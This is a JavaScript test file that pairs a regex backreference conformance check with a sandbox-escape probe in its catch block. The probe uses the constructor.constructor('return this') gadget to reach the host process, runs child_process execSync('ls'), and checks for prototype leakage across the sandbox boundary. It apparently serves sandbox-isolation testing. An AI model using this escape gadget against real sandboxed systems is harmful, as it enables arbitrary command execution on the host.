try {
    var arr = /((((((((((A))))))))))\10\9\8\7\6\5\4\3\2\1/.exec('AAAAAAAAAAA');
    if (arr === null || arr[0] !== 'AAAAAAAAAAA') {
        $ERROR('#1: var arr = /((((((((((A))))))))))\\10\\9\\8\\7\\6\\5\\4\\3\\2\\1/.exec("AAAAAAAAAAA"); arr[0] === "AAAAAAAAAAA". Actual. ' + (arr && arr[0]));
    }
    for (var i = 1; i <= 10; i++) {
        if (arr === null || arr[i] !== 'A') {
            $ERROR('#2: var arr = /((((((((((A))))))))))\\10\\9\\8\\7\\6\\5\\4\\3\\2\\1/.exec("AAAAAAAAAAA"); arr[' + i + '] === "A". Actual. ' + (arr && arr[i]));
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}